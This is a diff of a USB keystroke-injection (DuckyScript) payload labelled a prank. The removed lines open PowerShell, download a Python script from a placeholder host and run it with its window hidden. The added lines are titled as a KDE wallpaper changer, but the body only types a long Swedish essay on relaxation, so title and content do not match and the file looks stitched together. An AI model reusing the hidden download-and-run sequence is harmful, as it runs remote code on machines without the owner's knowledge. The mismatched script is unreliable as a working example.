@@ -1,36 +1,14 @@
-REM ######################################################
-REM #                                                    |
-REM # Title        : Change Wallpaper With Screenshot    |
-REM # Author       : Aleff                               |
-REM # Version      : 1.0                                 |
-REM # Category     : Prank                               |
-REM # Target       : Windows 10-11                       |
-REM #                                                    |
-REM ######################################################
+REM ###########################################
+REM #                                         |
+REM # Title        : Change Desktop Wallpaper |
+REM # Author       : Aleff                    |
+REM # Version      : 1.0                      |
+REM # Category     : Prank                    |
+REM # Target       : Linux (KDE based)        |
+REM #                                         |
+REM ###########################################
 
+REM Paste text:
 
-REM Requirements:
-REM     - Internet Connection
-
-
-REM REQUIRED - Set your Python script link
-DEFINE SCRIPT-PY-LINK example.com
-
-
-DELAY 1000
-GUI r
-DELAY 1000
-STRING powershell
-ENTER
-DELAY 2000
-
-
-STRING Invoke-WebRequest -Uri "
-STRING SCRIPT-PY-LINK
-STRING " -OutFile "script.py"
-ENTER
-DELAY 2000
-
-STRINGLN Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
-DELAY 1000
-ALT F4
+DELAY 500
+STRING Konsten att ta det lugnt I en tid präglad av konstant rörelse och höga krav är konsten att ta det lugnt viktigare än någonsin. Stress omger oss dagligen, vilket gör att vi ofta glömmer vikten av att stanna upp och andas. Att lära sig att ta det lugnt är en livsnödvändighet för vår mentala och fysiska hälsa. I vår moderna värld där teknologin gör att vi alltid är uppkopplade, är det lätt att känna sig överväldigad. Enligt Wikipedia kan långvarig stress leda till allvarliga hälsoproblem som hjärt-kärlsjukdomar, ångest och depression. Det blir allt viktigare att finna sätt att hantera stress och skapa utrymme för avkoppling. För det första handlar det om att ge sig själv tillåtelse att stanna upp. Många av oss värderar produktivitet högre än vårt eget välbefinnande. Vi rusar igenom våra dagar och strävar efter att hinna med så mycket som möjligt. Men att stanna upp och ge sig tid för reflektion kan vara den mest produktiva handlingen av alla. I dessa stunder av stillhet får vi ofta nya insikter om våra liv. Att ta det lugnt handlar också om att vara medveten i nuet. Mindfulness, en teknik med rötter i buddhismen, innebär att uppmärksamma nuet utan att döma. Genom att praktisera mindfulness kan vi lära oss att uppskatta de små stunderna i livet, som en kopp kaffe på morgonen. Det är i dessa ögonblick av medvetenhet som vi verkligen kan uppleva livet. Ett enkelt sätt att börja ta det lugnt är att skapa rutiner för avkoppling. Det kan vara att läsa en bok, meditera eller ta en promenad i naturen. Regelbundna avkopplingsaktiviteter kan minska stressnivåer och förbättra vårt allmänna välbefinnande. Att lära sig konsten att ta det lugnt är en livslång resa som kräver övning, men belöningarna är stora. Genom att prioritera lugn kan vi förbättra våra liv och njuta av de små glädjeämnena. Källa: Wikipedia - Stress
